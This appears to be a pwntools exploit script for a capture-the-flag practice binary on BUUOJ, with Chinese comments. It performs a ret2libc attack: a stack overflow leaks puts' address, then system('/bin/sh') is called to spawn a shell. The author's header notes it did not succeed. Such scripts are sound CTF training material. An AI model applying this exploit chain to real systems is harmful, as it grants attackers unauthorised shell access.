'''
@Author       : 白银
@Date         : 2023-04-11 15:18:36
@LastEditors  : 白银
@LastEditTime : 2023-04-11 17:07:34
@FilePath     : /pwn/bjdctf_2020_babyrop.py
@Description  : https://buuoj.cn/challenges#bjdctf_2020_babyrop
@Attention    : 打不通
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
from libcfind import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './bjdctf_2020_babyrop'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 25698)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x28  # ida看，buf和r差多少
# ROPgadget --binary bjdctf_2020_babyrop --only "pop|ret"
pop_rdi_ret = 0x400733 # 0x0000000000400733 : pop rdi ; ret
ret_addr = 0x4004c9# 0x00000000004004c9 : ret
puts_plt = elf.plt['puts']
print("puts_plt------", hex(puts_plt))
puts_got = elf.got['puts']
print("puts_got------", hex(puts_got))
main_addr = elf.symbols['main']
print("main_addr------", hex(main_addr))

io.sendlineafter('Input your choice!\n', '1')

payload1 = flat(['a' * padding , pop_rdi_ret, puts_got, puts_plt, main_addr])
print(payload1)
# io.recvuntil(b"story!\n")
io.sendlineafter('story!\n', payload1)
# io.recv()
# io.recv()
# puts_addr=u64(io.recv(6).ljust(8, b'\x00'))
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print("puts_addr------", hex(puts_addr))

# libc = finder('puts', puts_addr)
# libc_base = puts_addr - libc.dump('puts')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# io.sendlineafter('Input your choice!\n', '1')

payload2 = flat(['a' * padding, pop_rdi_ret, binsh_addr, system_addr])

# sleep(1)
io.recvuntil(b"story!\n")
io.sendline(payload2)

io.interactive()